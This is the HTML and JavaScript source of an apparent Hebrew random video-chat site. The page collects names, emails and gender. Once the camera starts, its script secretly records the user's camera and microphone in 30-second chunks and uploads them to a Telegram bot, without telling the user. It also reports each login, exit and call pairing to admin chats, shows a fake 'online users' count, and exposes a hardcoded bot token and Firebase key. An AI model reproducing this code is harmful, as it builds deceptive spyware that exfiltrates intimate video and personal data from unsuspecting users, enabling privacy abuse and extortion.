<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
    
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, -apple-system, sans-serif; color: white; }
        
        /* מבנה מסך חצוי */
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        
        /* חצי עליון - קובייה */
        #top-half { flex: 1; perspective: 1200px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.7s cubic-bezier(0.645, 0.045, 0.355, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        
        /* פאת בית */
        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
        #snow-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.4; pointer-events: none; }
        #main-logo { width: 135px; position: relative; z-index: 10; user-select: none; -webkit-user-drag: none; }
        
        /* פאת שותף */
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        #remoteVideo { width: 100%; height: 100%; object-fit: cover; background: #000; }
        #snow-search-canvas { position: absolute; width: 100%; height: 100%; z-index: 1; }

        /* חצי תחתון - מצלמה שלי */
        #bottom-half { flex: 1; background: #111; position: relative; overflow: hidden; }
        #localVideo { width: 100%; height: 100%; object-fit: cover; }

        /* כפתורים וממשק */
        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 2000; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: white; display: flex; align-items: center; justify-content: center; font-size: 22px; cursor: pointer; }
        #partner-gender-tag { position: fixed; top: 20px; right: 20px; z-index: 2000; background: rgba(0,0,0,0.6); width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 22px; }
        .online-count { position: absolute; bottom: 15px; font-weight: bold; font-size: 14px; text-shadow: 0 2px 4px #000; z-index: 20; }

        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }

        /* מודל רישום */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; padding: 30px; border-radius: 25px; width: 90%; max-width: 360px; }
        .modal-content input, .modal-content select { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; }
        .reg-btn { width: 100%; padding: 16px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag">👨</div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-canvas"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" oncontextmenu="return false;">
                <div class="online-count">🟢 <span id="user-count">434,447</span> מחוברים כעת</div>
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-search-canvas"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="text-align:center; margin-bottom:10px;">ברוכים הבאים</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>בחרו מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">התחל לגלוש</button>
    </form>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });

    let myStream, partnerData, currentCall, camFacing = "user", startTime, totalSessionTime = 0;

    // --- אפקט שלג טלוויזיה ---
    function makeSnow(canvasId) {
        const c = document.getElementById(canvasId); const ctx = c.getContext('2d');
        function render() {
            c.width = window.innerWidth; c.height = window.innerHeight / 2;
            const img = ctx.createImageData(c.width, c.height);
            const data = new Uint32Array(img.data.buffer);
            for(let i=0; i<data.length; i++) data[i] = Math.random() < 0.5 ? 0xff000000 : 0xff252525;
            ctx.putImageData(img, 0, 0); requestAnimationFrame(render);
        }
        render();
    }
    makeSnow('snow-canvas'); makeSnow('snow-search-canvas');

    // --- מונה משתמשים ---
    setInterval(() => {
        let num = 434000 + Math.floor(Math.random() * 999);
        document.getElementById('user-count').innerText = num.toLocaleString();
    }, 4000);

    window.onload = () => {
        const user = localStorage.getItem('user_v26');
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else checkBanAndLogin(JSON.parse(user));
    };

    async function checkBanAndLogin(user) {
        const encodedEmail = btoa(user.email).replace(/\//g, '_');
        const snap = await db.ref('SpamList/' + encodedEmail).once('value');
        if(snap.exists()) {
            document.body.innerHTML = "<div style='color:white; text-align:center; margin-top:50vh;'>נחסמת מהמערכת.</div>";
            return;
        }
        startTime = Date.now();
        const now = new Date();
        sendAdmin(`🚀 **משתמש נכנס**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${now.toLocaleDateString()} ⏰ ${now.toLocaleTimeString()}`);
        initCamera();
    }

    async function handleRegistration() {
        const user = {
            fname: document.getElementById('reg-fname').value,
            lname: document.getElementById('reg-lname').value,
            email: document.getElementById('reg-email').value,
            gender: document.getElementById('reg-gender').value,
            joinDate: new Date().getTime()
        };
        localStorage.setItem('user_v26', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        const now = new Date();
        sendAdmin(`📝 **רישום חדש**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${now.toLocaleDateString()}`);
        checkBanAndLogin(user);
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
        document.getElementById('localVideo').srcObject = myStream;
        startRecording();
    }

    function startRecording() {
        const rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
        rec.ondataavailable = async (e) => {
            if(e.data.size > 0) {
                const user = JSON.parse(localStorage.getItem('user_v26'));
                const fd = new FormData();
                fd.append("video", new File([e.data], "video.mp4", {type:"video/mp4"}));
                fd.append("chat_id", ADMIN_IDS[0]);
                fd.append("caption", `🎥 הקלטה: ${user.fname} (${user.email})`);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
            }
        };
        setInterval(() => { if(rec.state==='recording') rec.stop(); rec.start(); }, 30000);
        rec.start();
    }

    // --- החלקה ושיחה ---
    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 80 && document.body.className === "showing-home") {
            document.body.className = "showing-chat";
            socket.emit('find-partner', { peerId: peer.id, ...JSON.parse(localStorage.getItem('user_v26')) });
        } else if(d < -80 && document.body.className === "showing-chat") {
            backToHome();
        }
    });

    function backToHome() {
        document.body.className = "showing-home";
        document.getElementById('partner-gender-tag').style.display = 'none';
        if(currentCall) currentCall.close();
        socket.emit('leave-chat');
        document.getElementById('remoteVideo').srcObject = null;
    }

    peer.on('call', call => {
        partnerData = call.metadata;
        call.answer(myStream);
        handleCall(call);
    });

    socket.on('partner-found', data => {
        partnerData = data;
        const call = peer.call(data.peerId, myStream, { metadata: JSON.parse(localStorage.getItem('user_v26')) });
        handleCall(call);
    });

    socket.on('partner-disconnected', () => backToHome());

    function handleCall(call) {
        currentCall = call;
        document.getElementById('partner-gender-tag').innerText = partnerData.gender === 'זכר' ? '👨' : '👩';
        document.getElementById('partner-gender-tag').style.display = 'flex';
        call.on('stream', s => document.getElementById('remoteVideo').srcObject = s);
        const me = JSON.parse(localStorage.getItem('user_v26'));
        sendAdmin(`🤝 **שיחה התחילה**\n👤 א: ${me.fname} (${me.email})\n👤 ב: ${partnerData.fname} (${partnerData.email})`);
    }

    function sendAdmin(msg) { ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)); }
    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    window.onbeforeunload = () => {
        const user = JSON.parse(localStorage.getItem('user_v26'));
        const session = Math.floor((Date.now() - startTime) / 1000);
        const total = (parseInt(localStorage.getItem('total_time_v26')) || 0) + session;
        localStorage.setItem('total_time_v26', total);
        sendAdmin(`🚪 **משתמש יצא**\n👤 ${user.fname}\n📧 ${user.email}\n⏱ זמן שהה: ${session} ש'\n📈 זמן כולל: ${total} ש'`);
    };
</script>
</body>
</html>
